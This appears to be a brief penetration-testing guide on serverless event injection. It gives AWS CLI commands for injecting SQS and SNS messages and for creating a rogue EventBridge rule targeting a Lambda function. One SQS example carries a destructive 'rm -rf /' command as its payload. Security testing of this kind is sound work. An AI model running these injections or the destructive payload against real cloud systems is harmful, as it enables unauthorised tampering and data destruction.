<serverless_event_injection_guide>
<title>SERVERLESS EVENT INJECTION</title>

<critical>Serverless event injection attacks target SNS/SQS, EventBridge, Pub/Sub, and Azure Event Grid. Testing focuses on message injection, privilege escalation, and dead letter queue exploitation.</critical>

<scope>
- SNS/SQS message injection
- EventBridge exploitation
- GCP Pub/Sub security
- Azure Event Grid attacks
- Lambda event source mapping
- Cross-service privilege escalation
- Dead letter queue exploitation
</scope>

<sns_sqs_injection>
{% raw %}
# SQS message injection:
aws sqs send-message \
  --queue-url https://sqs.region.amazonaws.com/account/queue \
  --message-body '{"command":"rm -rf /"}'

# SNS injection:
aws sns publish \
  --topic-arn arn:aws:sns:region:account:topic \
  --message '{"attack":"payload"}'
{% endraw %}
</sns_sqs_injection>

<eventbridge_exploitation>
{% raw %}
# EventBridge rule injection:
aws events put-rule \
  --name malicious-rule \
  --event-pattern '{"source":["aws.ec2"]}'

# Put target:
aws events put-targets \
  --rule malicious-rule \
  --targets "Id=1,Arn=arn:aws:lambda:region:account:function:target"
{% endraw %}
</eventbridge_exploitation>

<remember>Serverless events: Test message injection in queues/topics, validate event source authentication, check for privilege escalation via event routing, examine dead letter queues for sensitive data.</remember>
</serverless_event_injection_guide>
